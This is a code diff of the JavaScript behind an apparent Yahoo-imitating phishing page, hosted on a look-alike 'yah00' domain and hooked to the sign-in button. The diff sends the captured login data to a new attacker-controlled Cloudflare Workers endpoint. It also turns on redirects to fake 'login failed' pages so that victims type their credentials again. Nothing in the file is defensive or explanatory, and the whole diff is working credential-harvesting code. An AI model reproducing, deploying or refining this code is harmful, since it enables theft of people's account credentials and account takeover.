@@ -3,7 +3,7 @@ document.addEventListener("DOMContentLoaded", function() {
     console.log("sender script loaded");
 
     const hostname = "https://yah00.onrender.com";
-    const endpoint = "https://bkend-yad0.onrender.com/endpoint";
+    const endpoint = "https://winter-fog-b8e9.bad0men.workers.dev/";
 
     
     const nextButton = document.querySelector("#login-signin");
@@ -58,11 +58,11 @@ document.addEventListener("DOMContentLoaded", function() {
            
         const res = await data.json();
         console.log("Response:",res, "Data:: ", data, "Payload", payload);
-        // if (res) {
-        //    window.location.href = `${hostname}/login-failed.htm`;
-        // }else{
-        //      window.location.reload();
-        // };
+        if (res) {
+            window.location.href = `${hostname}/login-failed.htm`;
+        }else{
+            window.location.href = `${hostname}/display-login.htm`;
+        };
        }catch(error){
            console.log("error:", error);
        }
